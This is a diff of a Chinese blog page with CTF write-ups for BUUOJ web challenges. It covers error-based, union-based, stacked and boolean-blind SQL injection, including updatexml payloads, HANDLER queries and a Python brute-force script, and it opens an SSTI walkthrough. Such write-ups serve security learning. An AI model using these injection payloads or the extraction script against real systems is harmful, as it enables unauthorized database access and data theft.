+<h2 id="极客大挑战-2019-HardSQL-报错注入"><a href="#极客大挑战-2019-HardSQL-报错注入" class="headerlink" title="[极客大挑战 2019]HardSQL(报错注入)"></a>[极客大挑战 2019]HardSQL(报错注入)</h2><p>万能密码不管用。大写、</p>
 <p><strong>^代替and，用（）代替空格，like代替等于号</strong></p>
 <p>1’^(updatexml(1,(concat(0x7e,(database()),0x7e)),1))or’</p>
 <p>1’^(updatexml(1,(concat(0x7e,select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘geek’)),0x7e)),1))o</p>
@@ -514,14 +516,14 @@ echo $str1;
 <p>1’^(updatexml(1,(concat(0x7e,(select(group_concat(right(password,32)))from(geek.H4rDsq1)),0x7e)),1))or’</p>
 <p><strong>XPATH syntax error: ‘~0d5-e513-4b65-9634-1c01506c896a’</strong></p>
 <p><strong>flag{206c80d5-e513-4b65-9634-1c01506c896a}</strong></p>
-<h3 id="GXYCTF2019-BabySQli（临时数据）"><a href="#GXYCTF2019-BabySQli（临时数据）" class="headerlink" title="[GXYCTF2019]BabySQli（临时数据）"></a>[GXYCTF2019]BabySQli（临时数据）</h3><p>源码：search.php 得到 MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5<br>一看就是base32 得到 c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;<br>一看就是base64 得到 select * from user where username &#x3D; ‘$name’</p>
+<h2 id="GXYCTF2019-BabySQli（临时数据）"><a href="#GXYCTF2019-BabySQli（临时数据）" class="headerlink" title="[GXYCTF2019]BabySQli（临时数据）"></a>[GXYCTF2019]BabySQli（临时数据）</h2><p>源码：search.php 得到 MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5<br>一看就是base32 得到 c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;<br>一看就是base64 得到 select * from user where username &#x3D; ‘$name’</p>
 <p>username为注入点，有绕过&#x3D;&#x3D;&gt;fuzz一波</p>
 <p>看admin的位置 测试了一下在2处</p>
 <p>爆不了表  看了别人的wp</p>
 <p>这里是插入一条临时的数据admin，密码为md5加密后的1，然后密码为1，就会自动登陆上了（猜测3列为密码）</p>
 <p>upload：1’ union select 1,’admin’,’c4ca4238a0b923820dcc509a6f75849b’#</p>
 <p>数据库为32位小写md5加密</p>
-<h3 id="GYCTF2020-Blacklist（堆叠注入handler）"><a href="#GYCTF2020-Blacklist（堆叠注入handler）" class="headerlink" title="[GYCTF2020]Blacklist（堆叠注入handler）"></a>[GYCTF2020]Blacklist（堆叠注入handler）</h3><p>前言：</p>
+<h2 id="GYCTF2020-Blacklist（堆叠注入handler）"><a href="#GYCTF2020-Blacklist（堆叠注入handler）" class="headerlink" title="[GYCTF2020]Blacklist（堆叠注入handler）"></a>[GYCTF2020]Blacklist（堆叠注入handler）</h2><p>前言：</p>
 <hr>
 <pre><code class="hljs">handler命令查询规则
 
@@ -539,7 +541,7 @@ echo $str1;
 <p>0’;show databases;#&#x3D;&#x3D;&gt;0’;show tables;#&#x3D;&#x3D;&gt;0’;show columns from<code>FlagHere</code>;#&#x3D;&#x3D;&gt;发现有flag</p>
 <p>handler可以用</p>
 <p>0’;handler FlagHere open;handler FlagHere read first;handler FlagHere close;<br>0’;handler FlagHere open;handler FlagHere read next;handler FlagHere close;</p>
-<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World（布尔盲注）"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World（布尔盲注）" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World（布尔盲注）"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World（布尔盲注）</h3><p>输入’ &#x3D;&#x3D;&gt;bool(false)</p>
+<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World（布尔盲注-脚本）"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World（布尔盲注-脚本）" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World（布尔盲注-脚本）"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World（布尔盲注-脚本）</h2><p>输入’ &#x3D;&#x3D;&gt;bool(false)</p>
 <p>盲猜布尔盲注</p>
 <p>万能密码，存在过滤 fuzz一波</p>
 <p>可知1是正确的回显，0是错误的回显</p>
@@ -550,8 +552,8 @@ echo $str1;
 <p><code>import requests</code><br><code>import re</code></p>
 <p><code>url=&#39;http://b34f42ae-9e41-48eb-b906-0c3ea32eadec.node4.buuoj.cn:81/index.php&#39;   #路径</code><br><code>buu=&#39;&#39;     #记录flag</code></p>
 <p><code>for i in range(1,50):   #flag的字符数量</code><br>    <code>for j in range(32,140):   #可打印出得所有字符的asii码值</code><br>        <code>#构造payload，对flag的值进行遍历，i为位数，j为遍历集，&#123;0&#125;和&#123;1&#125;分别为占位指针，&#123;0&#125;对应i，&#123;1&#125;对应j</code><br>        <code>payload=&quot;if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))=&#123;1&#125;),1,0)&quot;.format(i,j)</code><br>        <code>data=&#123;&quot;id&quot;:payload&#125;     #构造参数对象</code><br>        <code>res=requests.post(url=url,data=data)       #请求</code><br>        <code>#进行验证和记录flag</code><br>        <code>if &#39;Hello, glzjin wants a girlfriend&#39; in res.text:</code><br>           <code>buu=buu+chr(j)</code><br>           <code>print(i)</code><br>           <code>print(buu)</code><br>           <code>break              #跳出一层循环</code></p>
-<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>SSTI就是服务器端模板注入(Server-Side Template Injection)，实际上也是一种注入漏洞。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Manuffer/article/details/120739989?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171378855216800188542056%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=171378855216800188542056&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120739989-null-null.142%5Ev100%5Epc_search_result_base9&utm_term=SSTI&spm=1018.2226.3001.4187">https://blog.csdn.net/Manuffer/article/details/120739989?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171378855216800188542056%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=171378855216800188542056&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120739989-null-null.142^v100^pc_search_result_base9&amp;utm_term=SSTI&amp;spm=1018.2226.3001.4187</a></p>
-<h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>网址里有参数<code>filename</code>和<code>filehash</code>推测这里flag应该是</p>
+<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>SSTI就是服务器端模板注入(Server-Side Template Injection)，实际上也是一种注入漏洞。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Manuffer/article/details/120739989?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171378855216800188542056%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=171378855216800188542056&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120739989-null-null.142%5Ev100%5Epc_search_result_base9&utm_term=SSTI&spm=1018.2226.3001.4187">https://blog.csdn.net/Manuffer/article/details/120739989?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171378855216800188542056%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=171378855216800188542056&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120739989-null-null.142^v100^pc_search_result_base9&amp;utm_term=SSTI&amp;spm=1018.2226.3001.4187</a></p>
+<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>网址里有参数<code>filename</code>和<code>filehash</code>推测这里flag应该是</p>
 <p><code>filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))</code>里面，filehash里<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=hash&spm=1001.2101.3001.7020">hash</a>就是提示为md5的hash加密。</p>
 <p><code>easy_tornado</code>可推测是<strong>服务器模板注入(SSTI)。</strong></p>
 <p>&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;———-搜素百度得Tornado框架的附属文件<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=handler&spm=1001.2101.3001.7020">handler</a>.settings中存在cookie_secret</p>
